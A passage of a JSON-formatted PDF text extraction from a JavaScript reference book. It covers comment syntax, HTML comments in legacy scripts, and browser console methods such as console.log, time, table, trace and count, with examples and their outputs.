        "img": []
    },
    {
        "text": "Everything after the  //  until the end of the line is excluded from execution.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  elementAt (  event  )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // Gets the element from Event coordinates",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return  document. elementFromPoint ( event. clientX ,  event. clientY ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// TODO: write more cool stuff!",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Multi-line Comment  /**/",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Everything between the opening  /*  and the closing  */  is excluded from execution, even if the opening and closing are on di\ufb00erent lines. /*",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "   Gets the element from Event coordinates.    Use like:    var clickedEl = someEl.addEventListener(\"click\", elementAt, false); */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  elementAt (  event  )   {    return  document. elementFromPoint ( event. clientX ,  event. clientY ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "/* TODO: write more useful comments! */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 4.2: Using HTML comments in JavaScript (Bad practice)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "HTML comments (optionally preceded by whitespace) will cause code (on the same line) to be ignored by the browser also, though this is considered  bad practice . One-line comments with the HTML comment opening sequence ( <!-- ): Note:  the JavaScript interpreter ignores the closing characters of HTML comments ( --> ) here.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<!-- A single-line comment.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "<!-- -->  Identical to using `//` since <!-- -->  the closing `-->` is ignored.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This technique can be observed in legacy code to hide JavaScript from browsers that didn't support it:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<script   type = \"text/javascript\"   language = \"JavaScript\" > <!-- /* Arbitrary JavaScript code.    Old browsers would treat    it as HTML code. */ // -- >",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 18",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "</script>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "An HTML closing comment can also be used in JavaScript (independent of an opening comment) at the beginning of a line (optionally preceded by whitespace) in which case it too causes the rest of the line to be ignored:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "-->  Unreachable JS code",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "These facts have also been exploited to allow a page to call itself \ufb01rst as HTML and secondly as JavaScript. For example: <!--",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "self.postMessage('reached JS \"file\"'); /* -->",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "<!DOCTYPE html>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "<script>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var w1 = new Worker('#1'); w1.onmessage = function (e) {     console.log(e.data); // 'reached JS \"file\" };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "</script> <!-- */ -->",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When run a HTML, all the multiline text between the  <!--  and  -->  comments are ignored, so the JavaScript contained therein is ignored when run as HTML. As JavaScript, however, while the lines beginning with  <!--  and  -->  are ignored, their e\ufb00ect is not to escape over multiple  lines, so the lines following them (e.g.,  self. postMessage ( ... ) will not be ignored when run as JavaScript, at least until they reach a  JavaScript  comment, marked by  /*  and  */ . Such JavaScript comments are used in the above example to ignore the remaining  HTML  text (until the  -->  which is also ignored as JavaScript).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 19",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 5: Console",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "The information displayed by a  debugging/web console  is made available through the multiple  methods of the console  Javascript object  that can be consulted through  console. dir ( console ) . Besides the  console. memory property, the methods displayed are generally the following (taken from Chromium's output): assert clear count debug dir dirxml error group groupCollapsed groupEnd info log markTimeline pro\ufb01le pro\ufb01leEnd table time timeEnd timeStamp timeline timelineEnd trace warn",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Opening the Console",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "In most current browsers, the JavaScript Console has been integrated as a tab within Developer Tools. The shortcut keys listed below will open Developer Tools, it might be necessary to switch to the right tab after that.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chrome",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Opening the  \u201c Console \u201d  panel of Chrome \u2019 s  DevTools : Windows / Linux: any of the following options.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": " Ctrl   +   Shift   +   J ",
        "font_name": "RobotoMono-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " Ctrl   +   Shift   +   I  , then click on the  \u201c Web Console \u201d  tab  or  press   ESC   to toggle the console on and o\ufb00  F12  , then click on the  \u201c Console \u201d  tab  or  press   ESC   to toggle the console on and o\ufb00 Mac OS:   Cmd   +   Opt   +   J ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Firefox",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 20",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Opening the  \u201c Console \u201d  panel in Firefox \u2019 s  Developer Tools : Windows / Linux: any of the following options.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": " Ctrl   +   Shift   +   K ",
        "font_name": "RobotoMono-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " Ctrl   +   Shift   +   I  , then click on the  \u201c Web Console \u201d  tab  or  press   ESC   to toggle the console on and o\ufb00  F12  , then click on the  \u201c Web Console \u201d  tab  or  press   ESC   to toggle the console on and o\ufb00 Mac OS:   Cmd   +   Opt   +   K ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Edge and Internet Explorer",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Opening the  \u201c Console \u201d  panel in the  F12 Developer Tools :  F12  , then click on the  \u201c Console \u201d  tab",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Safari",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Opening the  \u201c Console \u201d  panel in Safari \u2019 s  Web Inspector  you must \ufb01rst enable the develop menu in Safari's Preferences",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 21",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Then you can either pick \"Develop->Show Error Console\" from the menus or press    \u2318    +   Option   +   C ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": [
            "output_directory\\image_37_1.png"
        ]
    },
    {
        "text": "Opera",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Opening the  \u201c Console \u201d  in opera:  Ctrl   +   Shift   +   I  ,then click on the  \u201c Console \u201d  tab",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Compatibility",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "When using or emulating Internet Explorer 8 or earlier versions (e.g. through Compatibility View / Enterprise Mode) the console will  only  be de\ufb01ned when the Developer Tools are active, so  console. log ()  statements can cause an exception and prevent code from executing. To mitigate this, you can check to see if the console is available before you log:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( typeof  window. console   !==   'undefined' ) {    console. log ( \"Hello World\" ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Or at the start of your script you can identify if the console is available and if not, de\ufb01ne a null function to catch all",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 22",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "of your references and prevent exceptions.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   (! window. console ) {     console  =   { log :   function ()   {}}; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note this second example will stop  all  console logs even if the developer window has been opened. Using this second example will preclude use of other functions such as  console. dir ( obj )  unless that is speci\ufb01cally added. A browser's debugging console or  web console  is generally used by developers to identify errors, understand \ufb02ow of execution, log data and for many other purpose at runtime. This information is accessed through the  console object.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 5.1: Measuring time - console.time()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "console. time ()  can be used to measure how long a task in your code takes to run. Calling  console. time ([ label ])  starts a new timer. When  console. timeEnd ([ label ])  is called, the elapsed time, in milliseconds, since the original  . time ()  call is calculated and logged. Because of this behavior, you can call . timeEnd ()  multiple times with the same label to log the elapsed time since the original  . time ()  call was made.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Example 1:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. time ( 'response in' ); alert ( 'Click to continue' ); console. timeEnd ( 'response in' ); alert ( 'One more time' ); console. timeEnd ( 'response in' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "will output:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "response  in :  774.967ms response  in :  1402.199ms",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Example 2:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  elms  =  document. getElementsByTagName ( '*' );   //select all elements on the page console. time ( 'Loop time' ); for   ( var  i  =   0 ;  i  <   5000 ;  i ++)   {      for   ( var  j  =   0 ,  length  =  elms. length ;  j  <  length ;  j ++)   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // nothing to do ...",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     } } console. timeEnd ( 'Loop time' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "will output:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Loop time :  40.716ms",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 23",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 5.2: Formatting console output",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Many of the console's print methods can also handle C-like string formatting, using  %  tokens:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( '%s has %d points' ,   'Sam' ,   100 ); Displays  Sam has  100  points .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The full list of format speci\ufb01ers in JavaScript is:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Speci\ufb01er Output %s",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Formats the value as a string",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "%i  or  %d",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Formats the value as an integer %f Formats the value as a \ufb02oating point value %o Formats the value as an expandable DOM element %O Formats the value as an expandable JavaScript object %c Applies CSS style rules to the output string as speci\ufb01ed by the second parameter",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Advanced styling",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "When the CSS format speci\ufb01er ( %c ) is placed at the left side of the string, the print method will accept a second parameter with CSS rules which allow \ufb01ne-grained control over the formatting of that string:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( '%cHello world!' ,   'color: blue; font-size: xx-large' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Displays: It is possible to use multiple  %c  format speci\ufb01ers: any substring to the right of a  %c  has a corresponding parameter in the print method; this parameter may be an empty string, if there is no need to apply CSS rules to that same substring; if two  %c  format speci\ufb01ers are found, the 1st (encased in  %c ) and 2nd substring will have their rules de\ufb01ned in the 2nd and 3rd parameter of the print method respectively. if three  %c  format speci\ufb01ers are found, then the 1st, 2nd and 3rd substrings will have their rules de\ufb01ned in the 2nd , 3rd and 4th parameter respectively, and so on...",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": [
            "output_directory\\image_39_1.png"
        ]
    },
    {
        "text": "console. log ( \"%cHello %cWorld%c!!\" ,   // string to be printed",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "             \"color: blue;\" ,   // applies color formatting to the 1st substring              \"font-size: xx-large;\" ,   // applies font formatting to the 2nd substring              \"/* no CSS rule*/\"   // does not apply any rule to the remaining substring );",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Displays:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": [
            "output_directory\\image_39_2.png"
        ]
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 24",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Using groups to indent output",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Output can be indented and enclosed in a collapsible group in the debugging console with the following methods: console. groupCollapsed () : creates a collapsed group of entries that can be expanded through the disclosure button in order to reveal all the entries performed after this method is invoked; console. group () : creates an expanded group of entries that can be collapsed in order to hide the entries after this method is invoked. The indentation can be removed for posterior entries by using the following method: console.groupEnd() : exits the current group, allowing newer entries to be printed in the parent group after this method is invoked. Groups can be cascaded to allow multiple indented output or collapsible layers within each other:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  =  Collapsed group expanded  =>  ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": [
            "output_directory\\image_40_1.png",
            "output_directory\\image_40_2.png"
        ]
    },
    {
        "text": "Section 5.3: Printing to a browser's debugging console",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A browser's debugging console can be used in order to print simple messages. This debugging or  web console  can be directly opened in the browser (  F12   key in most browsers  \u2013  see  Remarks  below for further information) and the  log  method of the  console  JavaScript object can be invoked by typing the following:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( 'My message' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Then, by pressing   Enter  , this will display  My message  in the debugging console. console. log ()  can be called with any number of arguments and variables available in the current scope. Multiple arguments will be printed in one line with a small space between them.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   {  test :   1   }; console. log ([ 'string' ],   1 ,  obj ,  window );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  log  method will display the following in the debugging console:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 25",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 'string' ]    1   Object  {  test :   1   }   Window  {   /* truncated */   }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Beside plain strings,  console. log ()  can handle other types, like arrays, objects, dates, functions, etc.:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ([ 0 ,   3 ,   32 ,   'a string' ]); console. log ({  key1 :   'value' ,  key2 :   'another value' });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Displays:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Array  [ 0 ,   3 ,   32 ,   'a string' ] Object  {  key1 :   'value' ,  key2 :   'another value' }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Nested objects may be collapsed:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ({  key1 :   'val' ,  key2 :   [ 'one' ,   'two' ],  key3 :   {  a :   1 ,  b :   2   }   });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Displays:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object  {  key1 :   'val' ,  key2 :  Array [ 2 ],  key3 :  Object  }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Certain types such as  Date  objects and  function s may be displayed di\ufb00erently:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( new  Date ( 0 )); console. log ( function  test ( a ,  b )   {   return  c ;   });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Displays:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Wed Dec  31   1969   19 : 00 : 00 GMT - 0500  ( Eastern Standard Time ) function  test ( a ,  b )   {   return  c ;   }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Other print methods",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "In addition to the  log  method, modern browsers also support similar methods: console. info   \u2013  small informative icon ( \u24d8 ) appears on the left side of the printed string(s) or object(s). console. warn   \u2013  small warning icon (!) appears on the left side. In some browsers, the background of the log is yellow. console. error   \u2013  small times icon ( \u2297 ) appears on the left side. In some browsers, the background of the log is red. console. timeStamp   \u2013  outputs the current time and a speci\ufb01ed string, but is non-standard:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. timeStamp ( 'msg' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Displays:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "00 : 00 : 00.001  msg",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. trace   \u2013  outputs the current stack trace or displays the same output as the  log  method if invoked in the global scope.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  sec ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   first ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 26 }",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  first ()   {    console. trace (); } sec ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Displays:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "first sec ( anonymous  function )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The above image shows all the functions, with the exception of  timeStamp , in Chrome version 56. These methods behave similarly to the  log  method and in di\ufb00erent debugging consoles may render in di\ufb00erent colors or formats. In certain debuggers, the individual objects information can be further expanded by clicking the printed text or a small triangle ( \u25ba ) which refers to the respective object properties. These collapsing object properties can be open or closed on log. See the  console. dir  for additional information on this",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": [
            "output_directory\\image_42_1.png"
        ]
    },
    {
        "text": "Section 5.4: Including a stack trace when logging - console.trace()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "function  foo ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  console. trace ( 'My log statement' ); } foo ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Will display this in the console:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "My log statement       VM696 : 1   foo                   @  VM696 : 1    ( anonymous  function )   @   ( program ): 1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note: Where available it's also useful to know that the same stack trace is accessible as a property of the Error object. This can be useful for post-processing and gathering automated feedback.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  e  =   new  Error ( 'foo' ); console. log ( e. stack );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 5.5: Tabulating values - console.table()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "In most environments,  console. table ()  can be used to display objects and arrays in a tabular format.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "For example:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 27",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. table ([ 'Hello' ,   'world' ]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "displays like:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "(index) value 0",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"Hello\" 1 \"world\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. table ({ foo :   'bar' ,  bar :   'baz' });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "displays like:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "(index) value",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"foo\" \"bar\" \"bar\" \"baz\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  personArr  =   [ {          \"personId\" :   123 ,          \"name\" :   \"Jhon\" ,          \"city\" :   \"Melbourne\" ,          \"phoneNo\" :   \"1234567890\" }, {          \"personId\" :   124 ,          \"name\" :   \"Amelia\" ,          \"city\" :   \"Sydney\" ,          \"phoneNo\" :   \"1234567890\" }, {          \"personId\" :   125 ,          \"name\" :   \"Emily\" ,          \"city\" :   \"Perth\" ,          \"phoneNo\" :   \"1234567890\" }, {          \"personId\" :   126 ,          \"name\" :   \"Abraham\" ,          \"city\" :   \"Perth\" ,          \"phoneNo\" :   \"1234567890\" } ]; console. table ( personArr ,   [ 'name' ,   'personId' ]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "displays like:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 28",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 5.6: Counting - console.count()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": [
            "output_directory\\image_44_1.png"
        ]
    },
    {
        "text": "console. count ([ obj ])  places a counter on the object's value provided as argument. Each time this method is invoked, the counter is increased (with the exception of the empty string  '' ). A label together with a number is displayed in the debugging console according to the following format:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ label ]:  X",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "label  represents the value of the object passed as argument and  X  represents the counter's value. An object's value is always considered, even if variables are provided as arguments:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  o1  =   1 ,  o2  =   '2' ,  o3  =   \"\" ; console. count ( o1 ); console. count ( o2 ); console. count ( o3 ); console. count ( 1 ); console. count ( '2' ); console. count ( '' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Displays:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "1 :   1 2 :   1 :   1 1 :   2 2 :   2 :   1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Strings with numbers are converted to  Number  objects:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. count ( 42.3 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 29",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. count ( Number ( '42.3' )); console. count ( '42.3' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Displays:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "42.3 :   1 42.3 :   2 42.3 :   3",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Functions point always to the global  Function  object:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. count ( console. constructor ); console. count ( function (){}); console. count ( Object ); var  fn1  =   function  myfn (){}; console. count ( fn1 ); console. count ( Number );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Displays:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ object Function ]:   1 [ object Function ]:   2 [ object Function ]:   3 [ object Function ]:   4 [ object Function ]:   5",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Certain objects get speci\ufb01c counters associated to the type of object they refer to:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. count ( undefined ); console. count ( document. Batman ); var  obj ; console. count ( obj ); console. count ( Number ( undefined )); console. count ( NaN ); console. count ( NaN + 3 ); console. count ( 1 / 0 ); console. count ( String ( 1 / 0 )); console. count ( window ); console. count ( document ); console. count ( console ); console. count ( console. __proto__ ); console. count ( console. constructor . prototype ); console. count ( console. __proto__ . constructor . prototype ); console. count ( Object. getPrototypeOf ( console )); console. count ( null );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Displays:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "undefined :   1 undefined :   2 undefined :   3 NaN :   1 NaN :   2 NaN :   3 Infinity :   1 Infinity :   2",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "[ object Window ]:   1 [ object HTMLDocument ]:   1 [ object Object ]:   1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 30",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ object Object ]:   2 [ object Object ]:   3 [ object Object ]:   4 [ object Object ]:   5",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "null :   1",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Empty string or absence of argument If no argument is provided while  sequentially inputting the count method in the debugging console , an empty",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "string is assumed as parameter, i.e.:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": ">  console. count ();    :   1 >  console. count ( '' );    :   2 >  console. count ( \"\" );    :   3",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 5.7: Clearing the console - console.clear()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
